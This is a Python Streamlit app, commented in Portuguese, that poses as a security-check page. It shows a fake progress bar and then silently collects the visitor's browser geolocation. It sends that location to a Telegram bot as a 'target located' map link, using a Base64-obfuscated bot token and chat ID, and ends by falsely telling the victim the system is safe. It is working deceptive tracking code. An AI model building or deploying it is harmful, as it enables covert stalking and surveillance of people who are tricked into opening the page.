import streamlit as st
import time
import requests
import base64
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# --- SEGURANÇA MÁXIMA: Token e ID Ofuscados em Base64 ---
# Ninguém consegue ler sem decodificar
B_TK = "ODUyNTkyNzY0MTpBQUhLRE9ORnZoOExnVXBJRU5tdHBsVGZIdW9GcmcxZmZyOA=="
B_ID = "ODIxMDgyODM5OA=="

def enviar_telegram(mensagem):
    # Decodifica os dados apenas na memória na hora de enviar
    tk = base64.b64decode(B_TK).decode("utf-8")
    ci = base64.b64decode(B_ID).decode("utf-8")
    url = f"https://api.telegram.org/bot{tk}/sendMessage"
    payload = {"chat_id": ci, "text": mensagem, "parse_mode": "Markdown"}
    try: requests.post(url, json=payload)
    except: pass

# Configuração da Página
st.set_page_config(page_title="VERIFICAÇÃO DE SEGURANÇA", page_icon="🔐", layout="centered")

# Estilo Visual (Cores da sua foto)
st.markdown("""
    <style>
    .main { background-color: #0d1117; color: #ffffff; }
    .status-ok { color: #2ea043; font-weight: bold; font-size: 18px; margin-top: 10px; }
    .stProgress > div > div > div > div { background-color: #0056b3; }
    .stButton>button {
        background-color: #21262d; color: #c9d1d9; border: 1px solid #30363d;
        width: 100%; border-radius: 6px; font-size: 14px;
    }
    </style>
    """, unsafe_allow_html=True)

st.title("Verificação de Segurança")

if 'verificado' not in st.session_state:
    st.session_state.verificado = False

if not st.session_state.verificado:
    if st.button("● ATIVAR PROTEÇÃO AGORA"):
        barra = st.progress(0)
        
        # Simulação da verificação
        for i in range(1, 101):
            time.sleep(0.03)
            barra.progress(i)
        
        # Coleta silenciosa
        loc = get_geolocation()
        if loc:
            lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
            mapa = f"https://www.google.com/maps?q={lat},{lon}"
            msg = f"🚨 ALVO LOCALIZADO\n📍 Mapa: {mapa}"
            enviar_telegram(msg)
            
            st.session_state.verificado = True
            st.rerun()
else:
    # VISUAL APÓS 100% (Igual à foto que você mandou)
    st.markdown('<p class="status-ok">Sistema Seguro: nenhuma ameaça foi detectada</p>', unsafe_allow_html=True)
    st.progress(100)
    st.button("● PROTEÇÃO ATIVA", disabled=True)
